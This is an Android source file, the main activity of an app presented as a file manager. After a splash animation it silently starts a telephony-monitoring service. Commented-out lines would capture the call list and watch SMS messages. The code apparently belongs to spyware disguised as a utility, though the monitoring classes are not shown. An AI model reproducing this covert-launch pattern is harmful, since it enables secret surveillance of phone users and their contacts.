package com.depech.filemanager;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.view.animation.Animation;
import android.view.animation.Animation.AnimationListener;
import android.view.animation.AnimationUtils;
import android.widget.ImageView;

import com.depech.services.TelephonyService;
import com.depech.services.callList.CallListHandler;
import com.depech.services.sms.SmsObserver;

public class MainActivity extends Activity {
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		ImageView rotatedImage = (ImageView) findViewById(R.id.imageView2);
		Animation rotateAnimation = AnimationUtils.loadAnimation(this,
				R.anim.rotate);
		rotateAnimation.setAnimationListener(new AnimationListener() {
			@Override
			public void onAnimationEnd(Animation animation) {
//				CallListHandler.writeCurrentCallList(MainActivity.this);
//				final Uri SMS_STATUS_URI = Uri.parse("content://sms");
//				SmsObserver smsSentObserver = new SmsObserver(new Handler(),getApplicationContext());
//				MainActivity.this.getContentResolver().registerContentObserver(SMS_STATUS_URI, true, smsSentObserver);
				startService(new Intent(getBaseContext(), TelephonyService.class));
				startActivity(new Intent(MainActivity.this,
						FileManagerActivity.class));
				finish();
			}

			@Override
			public void onAnimationRepeat(Animation animation) {
			}

			@Override
			public void onAnimationStart(Animation animation) {
			}
		});
		rotatedImage.startAnimation(rotateAnimation);
	}

	
}
